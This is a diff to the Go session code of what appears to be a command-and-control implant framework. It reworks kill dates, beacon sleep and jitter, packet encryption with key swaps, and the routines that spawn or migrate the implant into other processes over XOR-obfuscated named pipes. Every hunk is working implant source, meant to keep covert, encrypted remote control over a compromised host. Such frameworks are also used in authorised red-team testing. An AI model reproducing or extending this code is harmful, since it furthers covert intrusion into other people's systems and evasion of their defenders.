@@ -18,10 +18,8 @@ package c2
 
 import (
 	"context"
-	"errors"
 	"io"
 	"net"
-	"strconv"
 	"sync/atomic"
 	"time"
 	"unsafe"
@@ -99,7 +97,7 @@ func (s *Session) wait() {
 			<-s.tick.C
 		}
 	}
-	if s.IsClient() && s.kill != nil && time.Now().After(*s.kill) {
+	if s.IsClient() && !s.kill.IsZero() && time.Now().After(s.kill) {
 		if cout.Enabled {
 			s.log.Info(`[%s] Kill Date "%s" was hit, triggering shutdown!`, s.ID, s.kill.Format(time.UnixDate))
 		}
@@ -125,7 +123,7 @@ func (s *Session) wait() {
 		}
 	}
 	if s.tick == nil {
-		s.tick = time.NewTicker(w)
+		s.tick = newSleeper(w)
 	} else {
 		for len(s.tick.C) > 0 { // Drain the ticker.
 			<-s.tick.C
@@ -172,6 +170,11 @@ func (s *Session) listen() {
 		if cout.Enabled {
 			s.log.Trace("[%s] Waking up..", s.ID)
 		}
+		if s.errors == 0 {
+			// If the previous session ended with no errors, check Frags first
+			// to prevent stalling the connect loop.
+			s.markSweepFrags()
+		}
 		if s.state.Closing() {
 			if s.state.Moving() {
 				if cout.Enabled {
@@ -193,8 +196,7 @@ func (s *Session) listen() {
 			select {
 			case <-s.ctx.Done():
 				// Base context is canceled, so let's add fake timeout context to
-				// replace this one.
-				// 10 seconds seems fair.
+				// replace this one. 10 seconds seems fair.
 				s.ctx, z = context.WithTimeout(context.Background(), spawnDefaultTime)
 			default:
 			}
@@ -213,12 +215,8 @@ func (s *Session) listen() {
 			if j := s.p.Jitter(); j >= 0 && j <= 100 {
 				s.jitter = uint8(j)
 			}
-			if k := s.p.KillDate(); k != nil {
-				if k.IsZero() {
-					s.kill = nil
-				} else {
-					s.kill = k
-				}
+			if k, ok := s.p.KillDate(); ok {
+				s.kill = k
 			}
 			if w := s.p.WorkHours(); w != nil {
 				if w.Empty() {
@@ -350,6 +348,35 @@ func (s *Session) IsClosed() bool {
 func (s *Session) InChannel() bool {
 	return s.state.Channel() || s.state.ChannelValue()
 }
+func (s *Session) markSweepFrags() {
+	// Frags have their 'c' (count) value set to '5' every time they receive a
+	// matching Packet.
+	//
+	// If after 5 "rounds" (sleep-n-wake) and no Packets have been received, we
+	// consider it dud and clear/remove it.
+	//
+	// TODO(dij): Is 5 too graceful? Should it be 3 instead?
+	if len(s.frags) == 0 {
+		return
+	}
+	d := make([]uint16, 0, len(s.frags))
+	for k, v := range s.frags {
+		if v.c--; v.c == 0 {
+			for i := range v.data {
+				v.data[i].Clear()
+				v.data[i] = nil
+			}
+			v.data = nil
+			d = append(d, k)
+		}
+	}
+	for i := range d {
+		s.frags[d[i]] = nil
+		if delete(s.frags, d[i]); cout.Enabled {
+			s.log.Debug("[%s] Clearing out-of-date Frag Group 0x%X.", s.ID, d[i])
+		}
+	}
+}
 
 // Read attempts to grab a Packet from the receiving buffer.
 //
@@ -429,6 +456,19 @@ func (s *Session) close(w bool) error {
 	}
 	return nil
 }
+func (s *Session) pickWait(o *uint32) {
+	if bugtrack.Enabled {
+		defer bugtrack.Recover("c2.Session.pickWait()")
+	}
+	if s.wait(); atomic.LoadUint32(o) != 0 {
+		return
+	}
+	if n := s.keyNextSync(); n != nil {
+		s.send <- n
+	} else {
+		s.send <- &com.Packet{Device: s.ID}
+	}
+}
 func (s *Session) queue(n *com.Packet) {
 	if s.state.SendClosed() {
 		return
@@ -466,8 +506,8 @@ func (s *Session) Time() time.Duration {
 }
 
 // KillDate returns the current KillDate of this Session. If there is no KillDate
-// set, this function returns nil.
-func (s *Session) KillDate() *time.Time {
+// set, this function returns an empty 'time.Time' instance.
+func (s *Session) KillDate() time.Time {
 	return s.kill
 }
 
@@ -477,7 +517,6 @@ func (s *Session) KillDate() *time.Time {
 func (s *Session) Done() <-chan struct{} {
 	return s.ch
 }
-
 func (s *Session) channelRead(x net.Conn) {
 	if bugtrack.Enabled {
 		defer bugtrack.Recover("c2.Session.channelRead()")
@@ -485,7 +524,7 @@ func (s *Session) channelRead(x net.Conn) {
 	if cout.Enabled {
 		s.log.Info("[%s:C->S:R] %s: Started Channel writer.", s.ID, s.host)
 	}
-	for x.SetReadDeadline(empty); s.state.Channel(); x.SetReadDeadline(empty) {
+	for x.SetReadDeadline(time.Now().Add(s.sleep * sleepMod)); s.state.Channel(); x.SetReadDeadline(time.Now().Add(s.sleep * sleepMod)) {
 		n, err := readPacket(x, s.w, s.t)
 		if err != nil {
 			if cout.Enabled {
@@ -494,7 +533,7 @@ func (s *Session) channelRead(x net.Conn) {
 			break
 		}
 		// KeyCrypt: Decrypt incoming Packet here to be read.
-		if n.Crypt(&s.key); cout.Enabled {
+		if n.KeyCrypt(s.keys); cout.Enabled {
 			s.log.Trace(`[%s:C->S:R] %s: Received a Packet "%s".`, s.ID, s.host, n)
 		}
 		if err = receive(s, s.parent, n); err != nil {
@@ -518,7 +557,7 @@ func (s *Session) channelWrite(x net.Conn) {
 	if cout.Enabled {
 		s.log.Debug("[%s:C->S:W] %s: Started Channel writer.", s.ID, s.host)
 	}
-	for x.SetWriteDeadline(time.Now().Add(s.sleep * sleepMod)); s.state.Channel(); x.SetWriteDeadline(time.Now().Add(s.sleep * sleepMod)) {
+	for x.SetDeadline(time.Now().Add(s.sleep * sleepMod)); s.state.Channel(); x.SetDeadline(time.Now().Add(s.sleep * sleepMod)) {
 		n := s.next(false)
 		if n == nil {
 			if cout.Enabled {
@@ -530,23 +569,23 @@ func (s *Session) channelWrite(x net.Conn) {
 			n.Flags |= com.FlagChannelEnd
 		}
 		// KeyCrypt: Encrypt new Packet here to be sent.
-		if n.Crypt(&s.key); cout.Enabled {
+		if n.KeyCrypt(s.keys); cout.Enabled {
 			s.log.Debug(`[%s:C->S:W] %s: Sending Packet "%s".`, s.ID, s.host, n)
 		}
 		if err := writePacket(x, s.w, s.t, n); err != nil {
 			if n.Clear(); cout.Enabled {
-				if errors.Is(err, net.ErrClosed) {
+				if isClosedError(err) {
 					s.log.Debug("[%s:C->S:W] %s: Write channel socket closed.", s.ID, s.host)
 				} else {
 					s.log.Error("[%s:C->S:W] %s: Error attempting to write Packet: %s!", s.ID, s.host, err.Error())
 				}
 			}
 			// KeyCrypt: Revert key exchange as send failed.
-			s.keyRevert()
+			s.keyCheckRevert()
 			break
 		}
 		// KeyCrypt: "next" was called, check for a Key Swap.
-		s.keyCheck()
+		s.keyCheckSync()
 		if n.Clear(); n.Flags&com.FlagChannelEnd != 0 || s.state.ChannelCanStop() {
 			if cout.Enabled {
 				s.log.Debug("[%s:C->S:W] Session/Packet indicated channel close!", s.ID)
@@ -574,7 +613,7 @@ func (s *Session) session(c net.Conn) bool {
 	// KeyCrypt: Do NOT encrypt hello Packets.
 	if n.ID != SvHello {
 		// KeyCrypt: Encrypt new Packet here to be sent.
-		n.Crypt(&s.key)
+		n.KeyCrypt(s.keys)
 	}
 	if cout.Enabled {
 		s.log.Trace(`[%s] %s: Sending Packet "%s".`, s.ID, s.host, n)
@@ -585,11 +624,13 @@ func (s *Session) session(c net.Conn) bool {
 			s.log.Error("[%s] %s: Error attempting to write Packet: %s!", s.ID, s.host, err.Error())
 		}
 		// KeyCrypt: Revert key exchange as send failed.
-		s.keyRevert()
+		s.keyCheckRevert()
 		return false
 	}
 	// KeyCrypt: "next" was called, check for a Key Swap.
-	s.keyCheck()
+	if s.keyCheckSync() != nil {
+		return false
+	}
 	if n.Flags&com.FlagChannel != 0 && !s.state.Channel() {
 		s.state.Set(stateChannel)
 	}
@@ -600,8 +641,11 @@ func (s *Session) session(c net.Conn) bool {
 		}
 		return false
 	}
-	// KeyCrypt: Decrypt incoming Packet here to be read.
-	if n.Crypt(&s.key); n.Flags&com.FlagChannel != 0 && !s.state.Channel() {
+	if n.ID != SvComplete {
+		// KeyCrypt: Decrypt incoming Packet here to be read (if not a SvComplete).
+		n.KeyCrypt(s.keys)
+	}
+	if n.Flags&com.FlagChannel != 0 && !s.state.Channel() {
 		if s.state.Set(stateChannel); cout.Enabled {
 			s.log.Trace("[%s] %s: Enabling Channel as received Packet has a Channel flag!", s.ID, s.host)
 		}
@@ -610,7 +654,7 @@ func (s *Session) session(c net.Conn) bool {
 		s.log.Debug(`[%s] %s: Received a Packet "%s"..`, s.ID, s.host, n)
 	}
 	if err = receive(s, s.parent, n); err != nil {
-		if cout.Enabled {
+		if n.Clear(); cout.Enabled {
 			s.log.Error("[%s] %s: Error processing packet data: %s!", s.ID, s.host, err.Error())
 		}
 		return false
@@ -643,29 +687,14 @@ func (s *Session) pick(i bool) *com.Packet {
 		}
 	case !i && s.parent == nil && s.state.Channel():
 		var o uint32
-		go func() {
-			if bugtrack.Enabled {
-				defer bugtrack.Recover("c2.Session.pick.func1()")
-			}
-			if s.wait(); atomic.LoadUint32(&o) == 0 {
-				if s.doNextKeySwap() {
-					n := &com.Packet{Device: s.ID, Flags: com.FlagCrypt}
-					n.Write((*s.keyNew)[:])
-					s.send <- n
-				} else {
-					s.send <- &com.Packet{Device: s.ID}
-				}
-			}
-		}()
+		go s.pickWait(&o)
 		n := <-s.send
 		atomic.StoreUint32(&o, 1)
 		return n
 	case i:
 		return nil
 	}
-	if s.doNextKeySwap() {
-		n := &com.Packet{Device: s.ID, Flags: com.FlagCrypt}
-		n.Write((*s.keyNew)[:])
+	if n := s.keyNextSync(); n != nil {
 		return n
 	}
 	return &com.Packet{Device: s.ID}
@@ -816,7 +845,7 @@ func (s *Session) writeDeviceInfo(t uint8, w data.Writer) error {
 	if err := w.WriteInt64(int64(s.sleep)); err != nil {
 		return err
 	}
-	if s.kill != nil {
+	if !s.kill.IsZero() {
 		if err := w.WriteInt64(s.kill.Unix()); err != nil {
 			return err
 		}
@@ -846,8 +875,7 @@ func (s *Session) writeDeviceInfo(t uint8, w data.Writer) error {
 	if t != infoMigrate {
 		return nil
 	}
-	_, err := w.Write(s.key[:])
-	return err
+	return s.keys.Marshal(w)
 }
 func (s *Session) readDeviceInfo(t uint8, r data.Reader) ([]proxyData, error) {
 	switch t {
@@ -872,11 +900,10 @@ func (s *Session) readDeviceInfo(t uint8, r data.Reader) ([]proxyData, error) {
 	if err != nil {
 		return nil, err
 	}
-	if v > 0 {
-		d := time.Unix(v, 0)
-		s.kill = &d
+	if v == 0 {
+		s.kill = time.Time{}
 	} else {
-		s.kill = nil
+		s.kill = time.Unix(v, 0)
 	}
 	var w cfg.WorkHours
 	if err = w.UnmarshalStream(r); err != nil {
@@ -897,8 +924,7 @@ func (s *Session) readDeviceInfo(t uint8, r data.Reader) ([]proxyData, error) {
 	if t != infoMigrate {
 		return p, nil
 	}
-	_, err = r.Read(s.key[:])
-	return p, err
+	return p, s.keys.Unmarshal(r)
 }
 
 // Migrate will execute the provided runnable and will wait up to 60 seconds
@@ -966,7 +992,7 @@ func (s *Session) SpawnProfile(n string, b []byte, t time.Duration, e runnable) 
 	if cout.Enabled {
 		s.log.Debug(`[%s/SpN] Started PID %d, waiting %s for pipe "%s"..`, s.ID, p, t, n)
 	}
-	c := spinTimeout(s.ctx, pipe.Format(n+"."+strconv.FormatUint(uint64(p), 16)), t)
+	c := spinTimeout(s.ctx, pipe.Format(n+"."+util.Uitoa16(uint64(p))), t)
 	if c == nil {
 		return 0, ErrNoConn
 	}
@@ -974,17 +1000,14 @@ func (s *Session) SpawnProfile(n string, b []byte, t time.Duration, e runnable) 
 		s.log.Debug(`[%s/SpN] Received connection to "%s"!`, s.ID, c.RemoteAddr().String())
 	}
 	var (
-		w = data.NewWriter(crypto.NewXORWriter(crypto.XOR(n), c))
-		r = data.NewReader(crypto.NewXORReader(crypto.XOR(n), c))
+		g = crypto.XOR(n)
+		w = data.NewWriter(crypto.NewXORWriter(g, c))
+		r = data.NewReader(crypto.NewXORReader(g, c))
 	)
 	if err = w.WriteUint16(0); err != nil {
 		c.Close()
 		return 0, err
 	}
-	/*if err = w.WriteUint8(0xF); err != nil {
-		c.Close()
-		return 0, err
-	}*/
 	if err = w.WriteBytes(b); err != nil {
 		c.Close()
 		return 0, err
@@ -1075,7 +1098,7 @@ func (s *Session) MigrateProfile(wait bool, n string, b []byte, job uint16, t ti
 	if cout.Enabled {
 		s.log.Debug(`[%s/Mg8] Started PID %d, waiting %s for pipe "%s"..`, s.ID, e.Pid(), t, n)
 	}
-	c := spinTimeout(s.ctx, pipe.Format(n+"."+strconv.FormatUint(uint64(e.Pid()), 16)), t)
+	c := spinTimeout(s.ctx, pipe.Format(n+"."+util.Uitoa16(uint64(e.Pid()))), t)
 	if c == nil {
 		s.state.Unset(stateMoving)
 		s.lock.Unlock()
@@ -1085,8 +1108,9 @@ func (s *Session) MigrateProfile(wait bool, n string, b []byte, job uint16, t ti
 		s.log.Debug(`[%s/Mg8] Received connection from "%s"!`, s.ID, c.RemoteAddr().String())
 	}
 	var (
-		w = data.NewWriter(crypto.NewXORWriter(crypto.XOR(n), c))
-		r = data.NewReader(crypto.NewXORReader(crypto.XOR(n), c))
+		g = crypto.XOR(n)
+		w = data.NewWriter(crypto.NewXORWriter(g, c))
+		r = data.NewReader(crypto.NewXORReader(g, c))
 	)
 	if err = w.WriteUint16(job); err != nil {
 		c.Close()
